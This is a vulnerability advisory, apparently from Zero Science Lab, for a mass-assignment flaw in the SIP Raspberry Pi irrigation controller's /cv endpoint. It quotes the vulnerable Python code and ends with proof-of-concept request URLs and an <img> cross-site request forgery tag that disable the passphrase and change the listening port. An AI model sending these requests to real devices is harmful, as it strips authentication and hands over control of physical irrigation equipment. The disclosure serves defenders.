@@ -1,0 +1,99 @@
+
+SIP Sustainable Irrigation Platform 5.x (cv) Settings Mass Assignment
+
+
+Vendor: Dan-in-CA
+Product web page: https://github.com/Dan-in-CA/SIP
+Affected version: 5.2.16
+
+Summary: SIP is a free Raspberry Pi based Python program for
+controlling irrigation systems (sprinkler, drip, hydroponic,
+etc). It uses web technology to provide an intuitive user
+interface (UI) in several languages. The UI can be accessed
+in your favorite browser on desktop, laptop, and mobile devices.
+SIP has also been used to control pumps, lights, and other Irrigation
+related equipment.
+
+Desc: The application's value-setting interface copies every
+parameter received in an HTTP request directly into its internal
+settings object without restricting which settings may be changed.
+This can be exploited to modify arbitrary configuration values
+that the endpoint was never intended to expose, including disabling
+the passphrase or changing the listening port, by supplying the
+corresponding parameter names. When the optional passphrase is
+not enabled (factory default) this requires no authentication,
+and where the passphrase is enabled it defaults to 'opendoor' and
+the same result is reachable through cross-site request forgery.
+
+====================================================================
+/home/pi/SIP/webpages.py:
+-------------------------
+
+119: class change_values(ProtectedPage):
+120:     """Save controller values, return browser to home page."""
+121:
+122:     def GET(self):
+123:         self.change_values()
+124:
+125:     def change_values(self):    
+126:         qdict = web.input()
+127:         if "rsn" in qdict and qdict["rsn"] == "1":
+128:             pid = gv.pon - 1           
+129:             stop_stations()
+130:             if pid < 97:
+131:                 gv.phold[0] = pid
+132:                 gv.phold[1] = gv.lm + (gv.pd[pid]["start_min"] * 60) + total_duration(gv.pd[pid])         
+133:             raise web.seeother("/")
+134:         elif "en" in qdict and qdict["en"] == "0":
+135:             gv.srvals = [0] * (gv.sd["nst"])  # turn off all stations
+136:             set_output()
+137:         if "mm" in qdict and qdict["mm"] == "0":
+138:             clear_mm()            
+139:         if "rd" in qdict:        
+140:             if qdict["rd"]:
+141:                 gv.sd["rd"] = int(float(qdict["rd"]))
+142:                 gv.sd["rdst"] = round(gv.now + gv.sd["rd"] * 3600)
+143:                 stop_onrain()
+144:                 report_rain_delay_change()
+145:             else:
+146:                 gv.sd["rd"] = 0
+147:                 gv.sd["rdst"] = 0
+148:                 report_rain_delay_change()
+149:         for key in list(qdict.keys()):           <-------- m  a  s  s
+150:             try:
+151:                 gv.sd[key] = int(qdict[key])     <-------- assignment
+151:             except Exception:
+152:                 pass
+153:         jsave(gv.sd, "sd")
+154:         report_value_change()
+155:         raise web.seeother("/")  # Send browser back to home page
+
+====================================================================
+
+Tested on: Debian GNU/Linux 11 (bullseye) raspberrypi 6.1.21+ (armv6l/aarch64)
+           Python 3.9.2
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5997
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5997
+
+
+24.06.2026
+
+--
+
+Disable passphrase (CSRF/XSS):
+------------------------------
+
+http://SIP/cv?upas=0
+<img src="http://SIP/cv?upas=0">
+
+
+Set keys the endpoint doesn't own:
+----------------------------------
+
+http://SIP/cv?upas=1&htp=8081&nbrd=3
